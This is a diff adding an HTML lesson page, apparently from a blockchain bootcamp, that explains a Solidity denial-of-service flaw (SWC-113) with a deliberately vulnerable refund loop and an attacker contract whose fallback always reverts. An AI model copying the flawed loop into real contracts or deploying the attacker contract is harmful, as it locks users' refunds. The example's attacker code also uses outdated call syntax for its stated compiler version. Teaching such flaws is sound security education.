@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=">
+  <link rel="stylesheet" href="../../../style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js" async></script>
+  <script src="../../../js/text-bounce.js" async></script>
+  <title>Welcome</title>
+</head>
+<div class="body">
+  
+    <h1>DoS Attack Contract</h1>
+    <p>This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert (<a href="https://swcregistry.io/docs/SWC-113" target="_blank">SWC-113</a>).</p>
+  
+    <p>The <code>VulnerableContract</code> loops over the subscribers array, making a transfer to each address. This is dangerous because when the <code>refundFees()</code> function is called and the <code>VulnerableContract</code> attempts to send funds to the <code>MaliciousContract</code>, the <code>MaliciousContract</code> fallback function is called, which stops execution and reverts. This transaction will never succeed and <code>refundFees()</code> will never successfully execute, preventing any subscribers from getting their subscription fee back.</p>
+  
+    <p>
+      <br>
+    </p><pre class="wrong">
+pragma solidity 0.8.4;
+// Example DenialOfService Attack
+  
+contract VulnerableContract {
+    address owner = msg.sender;
+    address payable[] public subscribers;
+    uint FEE_COST = 1 ether;
+      
+    function subscribe() public payable {
+        require(msg.value == FEE_COST, &quot;Insufficient msg.value&quot;);
+        subscribers.push(msg.sender);
+    }
+      
+    function refundFees() public {
+        require(msg.sender == owner, &quot;msg.sender should be owner&quot;);
+        for(uint i = subscribers.length; i &gt; 0; i--) {
+            subscribers[i - 1].transfer(FEE_COST);
+            subscribers.pop();
+        }
+    }
+      
+    function getBalance() view public returns(uint) {
+        return address(this).balance;
+    }
+      
+    // Auxiliar function for demo. It wouldn&#39;t be present in a vulnerable contract
+    function removeLastSubscriber() public {
+        subscribers.pop();
+    }
+}
+  
+contract MaliciousContract {
+    VulnerableContract vulnerableContract = VulnerableContract(0x5E72914535f202659083Db3a02C984188Fa26e9f);
+      
+    function subscribe() public payable {
+        vulnerableContract.subscribe.value(msg.value)();   
+    }
+      
+    fallback() external payable {
+        require(false);
+    }
+}
+</pre>
+
+  <!-- Be sure to alter the link below to add in correct Module and Lesson Number  -->
+    <div class="footer">
+      <a href="https://github.com/ConsenSys-Academy/Blockchain-Developer-Bootcamp/edit/main/S03-smart-contracts/M6-security/L2c-dos-attack/index.html" target="_blank">Edit this page on Github</a>
+      
+      <div class="discord">
+        <img class="discord-logo" src="../../../img/discord.svg" alt="Discord logo" ><a href="https://discord.gg/FrHSjSn9dX" target="_blank" >Questions? Ask on Discord! </a>  
+      </div> 
+    </div>
+</div>
+
+</html>
